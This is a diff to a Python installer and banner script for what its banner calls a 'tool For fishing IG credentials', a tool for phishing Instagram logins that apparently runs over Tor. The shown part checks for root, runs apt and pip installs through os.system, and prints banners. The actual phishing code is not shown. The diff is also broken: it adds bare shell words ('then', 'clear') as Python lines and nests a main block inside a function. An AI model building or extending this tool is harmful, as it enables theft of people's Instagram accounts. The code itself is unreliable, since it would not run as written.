@@ -21,10 +21,23 @@ yellow='\e[1;33m'
 
 
 def run_server():
-    print("\033[92mHello, World! I am rooted.\033[0m")
+    print("\033[92m checking if rooted.\033[0m")
+
+def check_root():
+    if os.geteuid() != 0:
+        print("This script must be run as root")
+        exit(1)
+
+if __name__ == "__main__":
+    check_root()
+
+    # Continue with your script here
+    
 
     print("\033[92mRUN TOR FOR ANONYMOUS\033[0m")
     time.sleep(2)
+    then 
+    clear 
 
     # Update packages and install dependencies
     os.system("apt update && apt upgrade")
@@ -32,17 +45,17 @@ def run_server():
     os.system("apt install git")
     os.system("apt install curl")
     os.system("apt install python3")
-    os.system("apt install git")
     os.system("apt install ruby")
     os.system("apt install tor")
     os.system("apt install bash")
     os.system("apt install python3-pip")
-    os.system("pip install selenium")
     os.system("apt-get install xidel")
     os.system("apt-get install python3-selenium")
 
     print("\033[92mTERINSTALL\033[0m")
     time.sleep(1)
+    then 
+    clear 
 
     # Display info
     print("\033[92m\n\n")
@@ -55,7 +68,7 @@ def run_server():
     print("\033[92m\n\n")
     print("\033[92m         ***********************************************")
     print("\033[92m         #                                             #")
-    print("\033[92m         # tool For fishing IG credentials #")
+    print("\033[92m         #   tool For fishing IG credentials #")
     print("\033[92m         #   Follow Me On Github: @ephraim sib#")
     print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
     print("\033[92m         #   Changelog: 5-12-2023           #")
